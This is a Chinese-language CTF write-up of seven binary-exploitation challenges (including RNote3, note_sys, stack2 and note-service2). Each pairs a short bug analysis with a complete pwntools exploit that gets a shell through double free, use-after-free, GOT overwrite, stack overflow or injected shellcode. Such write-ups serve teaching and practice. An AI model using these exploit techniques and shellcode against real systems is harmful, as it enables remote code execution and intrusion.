---
title: 山石摸底WP
date: 2021-08-18 11:37:25
tags:
---

# rctf-2018-note3

## 分析

。。。坑题，简单但是又不是很舒服做的，不过是Ubuntu16的题相对来说好一点。

经典菜单题，皮的很菜单就显示一次不过不影响

漏洞在dele函数，这个洞不是很好看，

漏洞就在于他直接void **ptr;没有初始化，那么如果我连续free同一个chunk就会造成double free

```c
unsigned __int64 dele()
{
  int i; // [rsp+4h] [rbp-1Ch]
  void **ptr; // [rsp+8h] [rbp-18h]
  char s1[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("please input note title: ");
  sub_B98(s1, 8LL);
  for ( i = 0; i <= 31; ++i )
  {
    if ( qword_202060[i] && !strncmp(s1, (const char *)qword_202060[i], 8uLL) )
    {
      ptr = (void **)qword_202060[i];
      break;
    }
  }
  if ( ptr )
  {
    free(ptr[2]);
    free(ptr);
    qword_202060[i] = 0LL;
  }
  else
  {
    puts("not a valid title");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

## 利用思路

存在double free那就直接构造heap overlap

new一个fastbin chunk double free后再new 2个chunk free其中一个show另外一个就可以得到被free的内容

这里的话被free的那个大小在smallbin范围这样free的时候就可以得到指向main_arena+88的指针

调试得到结果

```c
Allocated chunk | PREV_INUSE
Addr: 0x56030ec23020
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x56030ec23040
Size: 0x111
fd: 0x7f0b26b98b78
bk: 0x7f0b26b98b78

```

```c
pwndbg> x/32gx 0x56030ec23020
0x56030ec23020:	0x000056030ec23050	0x0000000000000021
0x56030ec23030:	0x6868686868686868	0x6868686868686868

```

直接show另外一个就可以得到libc

得到libc之后，我们去攻击free_hook，利用UAF。

因为double free的利用使得没free的那个chunk指向了被free的chunk，那么我们相当于有了UAF漏洞了。

## EXP

```python
from pwn import *

one_gadget= 0x4526A  #0x4527a 
freehook=0x3c67a8


r=process('./RNote3')
#r=remote('192.168.40.10' ,'27428')

def add(idx, content_size, content):
    r.sendline('1')
    r.recvuntil('please input title: ')
    r.send(idx)
    r.recvuntil('please input content size: ')
    r.sendline(str(content_size))
    r.recvuntil('please input content: ')
    r.send(content)

def show(idx):
    r.sendline('2')
    r.recvuntil('please input note title: ')
    r.send(idx)

def edit(idx, content):
    r.sendline('3')
    print r.recvuntil('please input note title: ')
    r.send(idx)
    print r.recvuntil('please input new content: ')
    r.send(content)

def dele(idx):
    r.sendline('4')
    r.recvuntil('please input note title: ')
    r.send(idx)

r.recvuntil('5. Exit\n')

add('a' * 8, 24, 'a' * 24)

dele('a' * 8)
dele('a' * 8)
add('\x00' * 8, 24, 'h' * 24)
add('c' * 8, 256, 'r' * 256)
add('d' * 8, 24, 'p' * 24)#separate top chunk

dele('c' * 8)
#gdb.attach(r)

show('\x00' * 8)

r.recvuntil('note content: ')
libc_base = u64(r.recv(6).ljust(8,'\x00')) - 0x3c4b78
print 'libc base: {}'.format(hex(libc_base))

dele('d' * 8)
add('e' * 8, 256, 'e' * 256)
add('f' * 8, 24, '\x00' * 8 + p64(24) + p64(libc_base + freehook))
#gdb.attach(r)
edit('\x00' *8 + '\n', p64(libc_base + one_gadget) + '\n')

dele('\x00' * 8)
r.interactive()
```





# when_did_you_born

攻防世界原题，简单栈覆盖。

## exp

```python
from pwn import *

r = remote("192.168.40.10", 24032)

payload = 'a' * (0x20 - 0x18) + p64(1926)

r.recvuntil("What's Your Birth?\n")
r.sendline("2000")

r.recvuntil("What's Your Name?\n")
r.sendline(payload)

print r.recv()
print r.recv()
```



# qctf2018-stack2

偏移的寻找要GBD动调，IDA显示的不准确，应该是汇编上做了手脚

在第一次输入完成的时候080486D5这里打断点

还有就是在main的retn上打断点

这样就可以发现真正的偏移

断点1 0x080486D5

```c
EAX  0xffffcf68 ◂— 0xe0 #存放数组的地址在eax
 EBX  0x0
 ECX  0x1046a
 EDX  0xffffcf68 ◂— 0xe0
 EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
 ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
 EBP  0xffffcfd8 ◂— 0x0
 ESP  0xffffcf30 —▸ 0xf7ffda74 —▸ 0xf7fd3470 —▸ 0xf7ffd918 ◂— 0x0
 EIP  0x80486d5 (main+261) ◂— 0x45830888

```

断点2

```c
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*EAX  0x0
 EBX  0x0
*ECX  0xffffcff0 ◂— 0x1
*EDX  0xf7fb687c (_IO_stdfile_0_lock) ◂— 0x0
 EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
 ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
*EBP  0x0
*ESP  0xffffcfec —▸ 0xf7e1a647 (__libc_start_main+247) ◂— add    esp, 0x10
*EIP  0x80488f2 (main+802) ◂— 0x669066c3

```

结果得到偏移为0x84

```
pwndbg> distance 0xffffcfec 0xffffcf68
0xffffcfec->0xffffcf68 is -0x84 bytes (-0x21 words)
```

这个题的环境布置有问题的。。。原出题人已经说明了，后面照用这道题的都没有改环境，远程都是没有布置/bin/bash

不过没事，找sh字符串传入用ROPgadget搜字符串就行了

## exp

```python
#coding=utf8
from pwn import *

r = remote('192.168.40.10','21810')

rsendlineafter("How many numbers you have:", "1")
rsendlineafter("Give me your numbers", "1")
system_addr = [0x50, 0x84, 0x04, 0x08]
offset = 0x84
for i in range(4):
	rsendlineafter("5. exit", "3")
	rsendlineafter("change:", str(offset+i))
	rsendlineafter("new number:", str(system_addr[i]))

sh_addr = [0x87, 0x89, 0x04, 0x08]
offset += 8
for i in range(4):
	rsendlineafter("5. exit", "3")
	rsendlineafter("change:", str(offset+i))
	rsendlineafter("new number:", str(sh_addr[i]))

rsendlineafter("5. exit", "5")
rinteractive()

```



# whctf-2017-note_sys

题目很良心给了源码，省了一点时间

直接源码分析了

dele函数

这个函数存在2个问题第一个note_to_write --，这里是指针在--。那么就意味着我我free一次他就减一次，64位，减一次相当于地址减去8

问题2 usleep(2000000);这个是纯正闲的没事干。。。。，题目是多线程的题目，在这里dele之前如果sleep了这条进程是休眠了2秒

但是在2秒内，我还可以进行别的操作。

```c
void *delete_func(void *arg)
{
	char **note_to_delete = note_to_write;
	note_to_write --;
	int tmp = count;
	tmp -= 1;
	usleep(2000000);
	if(count > 0)
	{
		free(*note_to_delete);
		count = tmp;
		printf("delete successfully!\n");
	}
	else
	{
		printf("too less notes!!\n");
		note_to_write ++;
		return 0;
	}
	return 0;
}
```

我们继续分析源码

char **note_to_write = notes;

并且

malloc_func里面chunk内容写入正好是到note_to_write

```c
int make_note()
{
	int cnt = 250;
	char inputs[256];
	char *ptr = inputs;
	memset(inputs, 0, 256);
	printf("input your note, no more than 250 characters\n");
	while(cnt)
	{
		char tmp;
		tmp = getchar();
		if(tmp != '\n' && tmp!= '\x00' && tmp != '\x90' && tmp )
		{
			*ptr = tmp;
			*ptr ++;
		}
		else
		{
			ptr = NULL;
			break;
		}
		cnt --;
	}
	pthread_t thread_tmp;
	pthread_create(&thread_tmp, NULL, malloc_func, (void*)inputs );
	return 0;
}
```



```c
void *malloc_func(void *arg)
{
	note_to_write ++;
	int tmp = count;
	char *to_copy = (char *)arg;
	tmp += 1;
	//usleep(100000);
	count = tmp;
	if(count > 34)
	{
		printf("too many notes!!\n");
		note_to_write --;
		return 0;
	}
	else
	{
		printf("logged successfully!\n");
		*note_to_write = malloc(256 * sizeof(char));
		memset(*note_to_write, 0, 256);
		memcpy(*note_to_write, to_copy, 250);
		return 0;
	}
}
```

综上，利用dele的时候指针--的漏洞让他指向puts_got，距离为0x98，那我们dele20次，当我们选择0写入的时候指针会++,也就是直接踩到got表上了，然后在dele进程还在休眠的时候对着写入shellcode直接getshell

## exp

```python
from pwn import *
r = process('./note_sys')
#r = remote('192.168.40.10' ,'23805')
context(os='linux',arch='amd64')

for i in range(20):
   r.sendlineafter('choice:','2')
payload=asm(shellcraft.sh())
r.sendlineafter('choice:','0')
r.sendlineafter('input your note, no more than 250 characters',payload)
 
r.interactive()
```



# qctf2018-diec-game

=-=直接覆盖随机数种子，直接写个c文件生成照着填

```c
#include <stdio.h>
#include <stdlib.h>

main()
{
    int i;
	srand(6);
	for(i=0;i<50;i++)
	{
	   int test = rand()%6+1;
	   printf("%d",test);
	}
}
```

## exp

```python
from pwn import *
r = process("./dice_game")
r=remote('192.168.40.10', '29999')
li = [4,2,5,6,3,6,5,4,5,5,6,2,4,6,5,3,1,1,4,5,4,3,5,1,6,6,1,5,6,4,2,1,3,4,1,6,1,3,1,6,6,1,5,1,4,3,4,5,4,1]
r.recv()
pay = "a"*0x40 + p64(6)
r.sendline(pay)
x = 1
for i in li:
	if x>50:
		break
	r.recvuntil("Give me the point(1~6): ")
	r.sendline(str(i))
	x += 1
r.interactive()

```



# xman-2017-caaa

简单栈溢出，给了后门，。。非常的蛇啊最简单的题放在最后

```python
int introduce()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("your name is:");
  read(0, buf, 0x80uLL);
  return printf("hello, %s!\n", buf);
}
```

## exp

```python
from pwn import *

r = remote('192.168.40.10' ,'27087')

payload='H' * (0x20+0x8) + p64(0x40078F)
r.recvuntil("4. Exit\n")
r.sendline("1")
r.recvuntil("your name is:\n")
r.send(payload)

r.interactive()
```



# ciscn-2018-note-service2 

存在数组溢出，如下

```c
int add()
{
  int result; // eax
  int v1; // [rsp+8h] [rbp-8h]
  unsigned int v2; // [rsp+Ch] [rbp-4h]

  result = dword_20209C;
  if ( dword_20209C >= 0 )
  {
    result = dword_20209C;
    if ( dword_20209C <= 11 )
    {
      printf("index:");
      v1 = sub_B91();
      printf("size:");
      result = sub_B91();
      v2 = result;
      if ( result >= 0 && result <= 8 )
      {
        qword_2020A0[v1] = malloc(result);
        if ( !qword_2020A0[v1] )
        {
          puts("malloc error");
          exit(0);
        }
        printf("content:");
        sub_B69(qword_2020A0[v1], v2);
        result = ++dword_20209C;
      }
    }
  }
  return result;
}
```

free未置0

```c
void dele()
{
  int v0; // [rsp+Ch] [rbp-4h]

  printf("index:");
  v0 = sub_B91();
  free((void *)qword_2020A0[v0]);
}
```

最主要的是NX没开

```shell
q@ubuntu:~/Desktop$ checksec note2
[*] '/home/q/Desktop/note2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments

```

这个题恶心在只能写入8个字节一次。。。。得把shellcode的字节码拆分

正常的汇编手撸64位shellcode，但是这里因为题目特性做点小修改

```python
context.arch = 'amd64'
code = '''
mov rax, 0x68732f6e69622f;
push rax
mov rdi, rsp;
mov rsi, 0;
xor rdx, rdx;
mov rax, 59;
syscall
'''
sc = asm(code)

```

修改如下

```
#xor rsi,rsi
#nop
#nop
#jmp 0x19
#push 0x3b
#pop rax
#nop
#nop
#jmp 0x19
```

想了很久的地方在机器码的得到。。最后直接拿IDA随便找个程序用keypatch看他的encode值就好了。pathc的太少了一开始么想起来笑死



这里为什么选择xor赋值是因为他的占用字节非常小

mov的话一个就要7个字节了

这里还要个坑点就是shellcode的拼接要用跳转来实现，本地打了好久一直卡在这个点，因为这两个点，最后都在做这题。。。差点还没赶上



关于跳转多少的计算，我们可以看下gdb

因为大小限制的非常恶心，一次写8个，但是又要用到跳转

一个jmp要2个字节，剩下6个字节拆分上面的指令来填写，不足的用NOP补齐

```c
pwndbg> x/32gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000021
0x555555757010:	0x0000000000000031	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000021
0x555555757030:	0x0000000000000032	0x0000000000000000

```

那么如此计算得到

fd位写入shellcode，5个字节的位置给shellcode，2个给JMP，剩下给nop补齐

从上一部分的fd到下一部分的fd距离刚好是0x19

## exp

```python
from pwn import *
context(arch = 'amd64')
r=process('./note2')
elf=ELF('./note2')
r = remote('192.168.40.10','21049')
def add(idx,content):
    r.recvuntil('your choice>>')
    r.sendline('1')
    r.recvuntil('index')
    r.sendline(str(idx))
    r.recvuntil('size')
    r.sendline(str(8))    
    r.recvuntil('content')
    r.send(content)


add(0,'/bin/sh')
add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xeb\x19')#modify the free_got to shellchunk2 whe our shell code build it out,this process will be like this free_got->system('/bin/sh')

add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xeb\x19')

add(2,asm('xor rdx,rdx')+'\x90\x90\xeb\x19')

add(3,asm('syscall')+'\x00'*5)#the 5 '\x00' just for fill register
r.recvuntil('your choice>>')
r.sendline('4')
r.recvuntil('index:')
r.sendline(str(0))


r.interactive()

```

